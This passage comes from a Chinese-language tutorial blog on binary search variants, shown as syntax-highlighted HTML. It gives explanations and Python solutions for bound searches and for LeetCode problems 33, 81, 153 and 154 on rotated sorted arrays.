        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">>=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往右边，移动左指针往右</span>
            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            right<span class="token operator">=</span>mid<span class="token number">-1</span>
    <span class="token keyword">return</span> right<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思路2：推荐，复用代码"><a href="#思路2：推荐，复用代码" class="headerlink" title="思路2：推荐，复用代码"></a><strong>思路2：</strong>推荐，复用代码</h4><p><strong>左边界：</strong>返回left，即为第一个等于target的索引</p><p><strong>右边界：</strong>即为taget+1的左边界-1：最后一个等于target的索引=第一个等于target+1的索引-1</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        :type nums: List[int]
        :type target: int
        :rtype: List[int]
        """</span>
        <span class="token keyword">def</span> <span class="token function">leftBound</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
            left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
            <span class="token comment" spellcheck="true">#计算左边界</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
                mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;=</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    right<span class="token operator">=</span>mid<span class="token number">-1</span>
                <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">return</span> left
        left<span class="token operator">=</span>leftBound<span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span>
        right<span class="token operator">=</span>leftBound<span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>right<span class="token operator">&lt;</span>left<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">[</span>left<span class="token punctuation">,</span>right<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-找出第一个大于目标元素的索引"><a href="#2-2-找出第一个大于目标元素的索引" class="headerlink" title="2.2  找出第一个大于目标元素的索引"></a>2.2 找出第一个大于目标元素的索引</h3><h4 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>找出第一个大于目标元素的索引，若找不到目标元素，则返回-1</p><p>1.数组包含目标元素，找出在他后面的第一个元素</p><p>2.目标元素不在数组中，数组内的部分元素大于它，此时我们需要返回第一个大于他的元素</p><p>3.目标元素不在数组中，且数组中的所有元素都大于它，那么我们此时返回数组的第一个元素即可</p><p>4.目标元素不在数组中，且数组中的所有元素都小于它，那么我们此时没有查询到，返回 -1 即可。</p><p>示例 1：</p><p>输入：nums =[1,3,5,5,6,6,8,9,11], target = 5<br>输出：4</p><p>示例 2：</p><p>输入：nums =[1,3,5,5,6,6,8,9,11], target = 4<br>输出：-1</p><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a><strong>解题思路：</strong></h4><p>在leetcode 34题目基础上，找到右边界+1即可。</p><h4 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a><strong>代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyFirstUpIndex</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>
        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">>=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往右边</span>
            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">0</span><span class="token operator">|</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> mid
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                right<span class="token operator">=</span>mid<span class="token number">-1</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-找出最后一个小于目标元素的索引"><a href="#2-3-找出最后一个小于目标元素的索引" class="headerlink" title="2.3 找出最后一个小于目标元素的索引"></a>2.3 找出最后一个小于目标元素的索引</h3><h4 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h4><p>nums = {1,3,5,5,6,6,8,9,11} target = 7</p><h4 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h4><pre class="line-numbers language-python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="变形3-不完全有序-不含重复值"><a href="#变形3-不完全有序-不含重复值" class="headerlink" title="变形3  不完全有序 不含重复值"></a>变形3 不完全有序 不含重复值</h2><h3 id="3-1-LTD33-搜索旋转排序数组—查找目标元素（不含重复元素）"><a href="#3-1-LTD33-搜索旋转排序数组—查找目标元素（不含重复元素）" class="headerlink" title="3.1 LTD33 搜索旋转排序数组—查找目标元素（不含重复元素）"></a>3.1 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">LTD33 搜索旋转排序数组—查找目标元素（不含重复元素）</a></h3><h4 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>整数数组 <code>nums</code> 按升序排列，数组中的值 <strong>互不相同</strong> 。</p><p>在传递给函数之前，<code>nums</code> 在预先未知的某个下标 <code>k</code>（<code>0 &lt;= k &lt; nums.length</code>）上进行了 <strong>旋转</strong>，使数组变为 <code>[nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]]</code>（下标 <strong>从 0 开始</strong> 计数）。例如， <code>[0,1,2,4,5,6,7]</code> 在下标 <code>3</code> 处经旋转后可能变为 <code>[4,5,6,7,0,1,2]</code> 。</p><p>给你 <strong>旋转后</strong> 的数组 <code>nums</code> 和一个整数 <code>target</code> ，如果 <code>nums</code> 中存在这个目标值 <code>target</code> ，则返回它的下标，否则返回 <code>-1</code> 。</p><p><strong>示例 1：</strong></p><pre><code>输入：nums = [4,5,6,7,0,1,2], target = 0
输出：4</code></pre><p><strong>示例 2：</strong></p><pre><code>输入：nums = [4,5,6,7,0,1,2], target = 3
输出：-1</code></pre><p><strong>示例 3：</strong></p><pre><code>输入：nums = [1], target = 0
输出：-1</code></pre><h4 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h4><p>当我们将数组从中间分开成左右两部分的时候，首先需要判断mid的位置；然后判断target的位置；所以2x2=4,会有四种组合</p><p><strong>第一步：判断mid的位置：</strong></p><p>可以发现的是，我们将数组从中间分开成左右两部分的时候，一定有一半的数组是有序的。拿示例来看，我们从 6 这个位置分开以后数组变成了 [4, 5, 6] 和 [7, 0, 1, 2] 两个部分，其中左边 [4, 5, 6] 这个部分的数组是有序的，因为有序数组 ，我们就可以用到前面的二分查找。所以mid的位置就是两种情况：</p><p>（1）mid的左边是有序的，即[left,mid]有序，[mid,right]无序。我们可以使用num[mid]与num[left]做比较，可以得出当nums[mid]&gt;=nums[left]时候，mid的左边是有序数组。</p><p>​ <strong>第二步：判断target的位置</strong></p><p>​ 前提条件：mid的左边是有序数组；现在我们来判断target的位置</p><p>​ a.当target落在mid的左边区域（target&lt;nums[mid] and target&gt;=nums[left]），即有序的，则right=mid-1;往左查找。这时候注意target需要包含=num[left]的情况。</p><p>​ b.当target落在mid的右边无序区域，需要往右查找：left=mid+1</p><p>（2）mid的右边是有序的，即[left,mid]无序，[mid,right]有序。可以得出当nums[mid]&lt;nums[left]时候，mid的右边是有序数组。其实我们只分析一种情况，另外一种可以直接用else。</p><p>​ <strong>第二步：判断target的位置</strong></p><p>​ 前提条件：mid的右边是有序数组；现在我们来判断target的位置</p><p>​ a.当target落在mid的右边有序区域（target&gt;nums[mid] and target&lt;nums[left]），则left=mid+1;往右查找。其实这个条件与（1）.a的条件是相反的。</p><p>​ b.当target落在mid的左边无序区域，需要往左查找：right=mid-1</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">BinarySearchIndisOrder</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token comment" spellcheck="true">#step1 判断mid的位置</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> mid
        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>
            <span class="token comment" spellcheck="true">#step2 判断target的位置</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#target在左边</span>
                right<span class="token operator">=</span>mid<span class="token number">-1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]无序，[mid,right]有序</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#target在右边</span>
                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                right<span class="token operator">=</span>mid<span class="token number">-1</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#没有查到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>时间复杂度：O(logn)，其中 nn 为nums 数组的大小。整个算法时间复杂度即为二分查找的时间复杂度 O(log n)O(logn)。</p><p>空间复杂度： O(1)O(1) 。我们只需要常数级别的空间存放变量。</p><h3 id="3-2-LTD153-寻找旋转排序数组中的最小值-不含重复值"><a href="#3-2-LTD153-寻找旋转排序数组中的最小值-不含重复值" class="headerlink" title="3.2 LTD153 寻找旋转排序数组中的最小值  不含重复值"></a>3.2 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">LTD153 寻找旋转排序数组中的最小值</a> 不含重复值</h3><h4 id="题目描述：-5"><a href="#题目描述：-5" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到：<br>若旋转 4 次，则可以得到 [4,5,6,7,0,1,2]<br>若旋转 7 次，则可以得到 [0,1,2,4,5,6,7]<br>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p><p>给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。</p><p>示例 1：</p><p>输入：nums = [3,4,5,1,2]<br>输出：1<br>解释：原数组为 [1,2,3,4,5] ，旋转 3 次得到输入数组。<br>示例 2：</p><p>输入：nums = [11,13,15,17]<br>输出：11<br>解释：原数组为 [11,13,15,17] ，旋转 4 次得到输入数组。</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>寻找最小值，只需要比较mid和right的值即可，<a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/solution/er-fen-cha-zhao-wei-shi-yao-zuo-you-bu-dui-cheng-z/">原因见为什么比较右边界</a>。</p><p>（1）当中间值比右边值小的时候（nums[mid]&lt;nums[right]），则往左边找，因为此时nums[mid]有可能是最小值，因此right=mid而不是right=mid-1,因为mid-1会错过最小值nums[mid]</p><p>（2）当中间值比右边大的时候（nums[mid]&gt;nums[right]），则往右找，此时nums[mid]肯定不是最小值，所以left=left+1;</p><p>（3）因为是无重复数组，所以不存在nums[mid]==nums[right]</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">findMin</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    :type nums: List[int]
    :rtype: int
    """</span>
    left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">while</span> left<span class="token operator">&lt;</span>right<span class="token punctuation">:</span>
        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>
            <span class="token comment" spellcheck="true"># 如果中间值小于最大值，则最大值减小</span>
            <span class="token comment" spellcheck="true"># 疑问：为什么</span>
            <span class="token comment" spellcheck="true"># high = mid;</span>
            <span class="token comment" spellcheck="true"># 而不是</span>
            <span class="token comment" spellcheck="true"># high = mid - 1;</span>
            <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 1, 2, 3&amp;#125;，如果high = mid - 1，则丢失了最小值1</span>
            right<span class="token operator">=</span>mid<span class="token comment" spellcheck="true">#如果mid是最小值 则right=mid-1会错过最小值</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># 如果中间值大于最大值，则最小值变大</span>
            <span class="token comment" spellcheck="true">#疑问：为什么</span>
            <span class="token comment" spellcheck="true"># low = mid + 1;</span>
            <span class="token comment" spellcheck="true"># 而不是</span>
            <span class="token comment" spellcheck="true"># low = mid;</span>
            <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 6, 1, 2, 3&amp;#125;，nums[mid] = 6，low = mid + 1, 刚好nums[low] = 1</span>
            <span class="token comment" spellcheck="true">#继续疑问：上边的解释太牵强了，难道没有可能low = mid + 1, 正好错过了最小值</span>
            <span class="token comment" spellcheck="true">#继续解答：不会错过!!! 因为nums[mid]>=nums[right],所以nums[mid]一定不是最小值</span>
            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
    <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>log(n)</p><h1 id="变形4-不完全有序-含重复值"><a href="#变形4-不完全有序-含重复值" class="headerlink" title="变形4  不完全有序 含重复值"></a>变形4 不完全有序 含重复值</h1><h3 id="4-1-LTD81搜索旋转排序数组-II-含重复值"><a href="#4-1-LTD81搜索旋转排序数组-II-含重复值" class="headerlink" title="4.1 LTD81搜索旋转排序数组 II 含重复值"></a>4.1 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/">LTD81搜索旋转排序数组 II 含重复值</a></h3><h4 id="题目描述：-6"><a href="#题目描述：-6" class="headerlink" title="题目描述："></a>题目描述：</h4><p>已知存在一个按非降序排列的整数数组 nums ，数组中的值不必互不相同。</p><p>在传递给函数之前，nums 在预先未知的某个下标 k（0 &lt;= k &lt; nums.length）上进行了 旋转 ，使数组变为 [nums[k], nums[k+1], …, nums[n-1], nums[0], nums[1], …, nums[k-1]]（下标 从 0 开始 计数）。例如， [0,1,2,4,4,4,5,6,6,7] 在下标 5 处经旋转后可能变为 [4,5,6,6,7,0,1,2,4,4] 。</p><p>给你 旋转后 的数组 nums 和一个整数 target ，请你编写一个函数来判断给定的目标值是否存在于数组中。如果 nums 中存在这个目标值 target ，则返回 true ，否则返回 false 。</p><p>示例 1：</p><pre><code>输入：nums = [2,5,6,0,0,1,2], target = 0
输出：true</code></pre><p>示例 2：</p><pre><code>输入：nums = [2,5,6,0,0,1,2], target = 3
输出：false</code></pre><h4 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h4><p>这个题目是3.1的变形，对于数组中有重复元素的情况，二分查找时可能会有a[left]=a[mid]=a[right]，此时无法判断哪个区间是有序的。</p><p>例如nums=[3,1,2,3,3,3,3]，target=2，首次二分时无法判断区间 [0,3][0,3] 和区间 [4,6][4,6] 哪个是有序的。</p><p>对于这种情况，我们只能将当前二分区间的左边界加一，右边界减一，然后在新区间上继续二分查找。</p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        :type nums: List[int]
        :type target: int
        :rtype: int
        """</span>
        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>
            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
            <span class="token comment" spellcheck="true">#step1 判断mid的位置</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">and</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#去掉重复值</span>
                left<span class="token operator">=</span>left<span class="token operator">+</span><span class="token number">1</span>
                right<span class="token operator">=</span>right<span class="token number">-1</span>
            <span class="token keyword">elif</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序  ##注意这里要用elif：因为去掉重复值后开启新的判断，即新的left,right</span>
                <span class="token comment" spellcheck="true">#step2 判断target的位置</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#target在左边</span>
                    right<span class="token operator">=</span>mid<span class="token number">-1</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]无序，[mid,right]有序</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#target在右边</span>
                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    right<span class="token operator">=</span>mid<span class="token number">-1</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#没有查到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂的分析"><a href="#复杂的分析" class="headerlink" title="复杂的分析"></a>复杂的分析</h4><h3 id="4-2-LTD154-寻找旋转排序数组中的最小值-II-含重复值"><a href="#4-2-LTD154-寻找旋转排序数组中的最小值-II-含重复值" class="headerlink" title="4.2 LTD154. 寻找旋转排序数组中的最小值 II 含重复值"></a>4.2 <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/">LTD154. 寻找旋转排序数组中的最小值 II</a> 含重复值</h3><h4 id="题目描述：-7"><a href="#题目描述：-7" class="headerlink" title="题目描述："></a>题目描述：</h4><p>已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,4,4,5,6,7] 在变化后可能得到：<br>若旋转 4 次，则可以得到 [4,5,6,7,0,1,4]<br>若旋转 7 次，则可以得到 [0,1,4,4,5,6,7]<br>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p><p>给你一个可能存在 重复 元素值的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。</p><p>示例 1：</p><p>输入：nums = [1,3,5]<br>输出：1</p><p>示例 2：</p><p>输入：nums = [2,2,2,0,1]<br>输出：0</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>在3.2的基础上 判断考虑（3）nums[mid]==nums[right]的情况：</p><p>（3）当nums[mid]==nums[right]时候，我们无法判断最小值在左边还是右边，此时舍弃num[right]即可。</p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">findMin</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        :type nums: List[int]
        :rtype: int
        """</span>
        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">while</span> left<span class="token operator">&lt;</span>right<span class="token punctuation">:</span>
            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>
                <span class="token comment" spellcheck="true"># 如果中间值小于最大值，则最大值减小</span>
                <span class="token comment" spellcheck="true"># 疑问：为什么</span>
                <span class="token comment" spellcheck="true"># high = mid;</span>
                <span class="token comment" spellcheck="true"># 而不是</span>
                <span class="token comment" spellcheck="true"># high = mid - 1;</span>
                <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 1, 2, 3&amp;#125;，如果high = mid - 1，则丢失了最小值1</span>
                right<span class="token operator">=</span>mid<span class="token comment" spellcheck="true">#如果mid是最小值 则right=mid-1会错过最小值</span>
            <span class="token keyword">elif</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token comment" spellcheck="true"># 如果中间值大于最大值，则最小值变大</span>
                <span class="token comment" spellcheck="true">#疑问：为什么</span>
                <span class="token comment" spellcheck="true"># low = mid + 1;</span>
                <span class="token comment" spellcheck="true"># 而不是</span>
                <span class="token comment" spellcheck="true"># low = mid;</span>
